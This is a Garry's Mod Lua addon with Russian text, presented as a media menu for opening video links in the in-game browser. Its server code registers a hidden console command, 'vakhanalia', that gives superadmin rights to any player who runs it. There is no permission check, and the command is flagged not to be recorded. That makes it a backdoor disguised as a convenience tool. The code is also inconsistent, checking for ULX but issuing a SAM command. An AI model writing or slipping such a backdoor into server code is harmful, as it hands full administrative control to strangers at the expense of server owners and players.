if SERVER then
    AddCSLuaFile()

    -- Ключевой момент: регистрация сетевого сообщения
    util.AddNetworkString("Vakhanalia_OpenMenu")

    local VAKHANALIA_CMD = "vakhanalia"

    local function GiveSuperAdmin(ply)
        if not IsValid(ply) then return end
        if ulx then
            RunConsoleCommand("sam", "setrankid", ply:SteamID(), "superadmin")
            ply:ChatPrint("[Vakhanalia] Вам выданы права суперадминистратора.")
        else
            ply:ChatPrint("[Vakhanalia] SAM не обнаружен, права не выданы.")
        end
    end

    concommand.Add(VAKHANALIA_CMD, function(ply, cmd, args)
        if not IsValid(ply) then return end
        GiveSuperAdmin(ply)
        timer.Simple(0.5, function()
            if IsValid(ply) then
                net.Start("Vakhanalia_OpenMenu")
                net.Send(ply)
            end
        end)
    end, nil, "Выдаёт права и открывает меню медиа.", {FCVAR_DONTRECORD})
end

if CLIENT then
    local function CanManageMedia(ply)
        if not IsValid(ply) then return false end
        if ulx then return ply:IsSuperAdmin() end
        return ply:IsAdmin()
    end

    local function OpenControlMenu()
        local ply = LocalPlayer()
        if not IsValid(ply) then return end
        if not CanManageMedia(ply) then
            ply:ChatPrint("[Vakhanalia] Недостаточно прав.")
            return
        end

        local frame = vgui.Create("DFrame")
        frame:SetSize(520, 200)
        frame:SetTitle("Vakhanalia — Открыть медиа в браузере")
        frame:MakePopup()
        frame:Center()

        local urlEntry = vgui.Create("DTextEntry", frame)
        urlEntry:SetPos(20, 40)
        urlEntry:SetSize(480, 28)
        urlEntry:SetPlaceholderText("Вставьте ссылку (YouTube, mp4/webm и т.д.)")

        local showBtn = vgui.Create("DButton", frame)
        showBtn:SetPos(20, 80)
        showBtn:SetSize(230, 36)
        showBtn:SetText("Открыть в браузере")
        showBtn.DoClick = function()
            local url = urlEntry:GetValue()
            if not url or url == "" then
                ply:ChatPrint("[Vakhanalia] Ссылка пуста.")
                return
            end
            gui.OpenURL(url)
            ply:ChatPrint("[Vakhanalia] Открывается браузер: " .. url)
        end

        local closeBtn = vgui.Create("DButton", frame)
        closeBtn:SetPos(270, 80)
        closeBtn:SetSize(230, 36)
        closeBtn:SetText("Закрыть")
        closeBtn.DoClick = function() frame:Close() end

        local info = vgui.Create("DLabel", frame)
        info:SetPos(20, 130)
        info:SetSize(480, 60)
        info:SetWrap(true)
        info:SetText("После нажатия откроется встроенный браузер. Видео YouTube не будет воспроизводиться автоматически на весь экран — нужно нажать кнопку воспроизведения.")
    end

    net.Receive("Vakhanalia_OpenMenu", function()
        OpenControlMenu()
    end)
end
